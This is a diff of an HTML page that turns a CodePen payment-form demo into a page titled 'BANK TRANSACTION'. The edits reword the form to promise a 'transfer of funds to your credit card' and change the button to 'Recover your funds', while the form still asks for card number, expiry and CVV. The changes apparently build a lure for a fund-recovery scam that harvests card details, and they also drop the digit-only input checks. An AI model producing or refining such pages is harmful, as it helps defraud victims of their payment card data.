@@ -2,7 +2,7 @@
 <html lang="en" >
 <head>
   <meta charset="UTF-8">
-  <title>CodePen - CSS Snackables - Week 2</title>
+  <title>BANK TRANSACTION</title>
   <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600" rel="stylesheet">
 
 <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
@@ -23,7 +23,7 @@
         <img src="https://cloud.githubusercontent.com/assets/3484527/19622568/9c972d44-987a-11e6-9dcc-93d496ef408f.png" class="modal__product" />
       </div>
       <div class="modal__content">
-        <h2>Your payment details</h2>
+        <h2>Details of the transfer of funds to your credit card</h2>
 
         <form>
           <ul class="form-list">
@@ -41,8 +41,8 @@
               <div>
                 <label>Expiration Date</label>
                 <div class="form-list__input-inline">
-                  <input type="text" name="cc_month" placeholder="MM"  pattern="\\d*" minlength="2" maxlength="2" required="" />
-                  <input type="text" name="cc_year" placeholder="YY"  pattern="\\d*" minlength="2" maxlength="2" required="" />
+                  <input type="text" name="cc_month" placeholder="MM"  minlength="2" maxlength="2" required="" />
+                  <input type="text" name="cc_year" placeholder="YYYY"   minlength="2" maxlength="4" required="" />
                 </div>
               </div>
               <div>
@@ -54,17 +54,17 @@
                     <span class="visuallyhidden">What is CVV?</span>
                   </a>
                 </label>
-                <input type="text" name="cc_cvc" placeholder="123" pattern="\\d*" minlength="3" maxlength="4" required="" />
+                <input type="text" name="cc_cvc" placeholder="123"  minlength="3" maxlength="4" required="" />
               </div>
             </li>
             <li class="form-list__row form-list__row--agree">
               <label>
                 <input type="checkbox" name="save_cc" checked="checked">
-                Save my card for future purchases
+                Save my card for future transfer
               </label>
             </li>
             <li>
-              <button type="submit" class="button" href="transfer-reject.html">Pay Now</button>
+              <button type="submit" class="button" href="transfer-reject.html">Recover your funds</button>
             </li>
           </ul>
         </form>
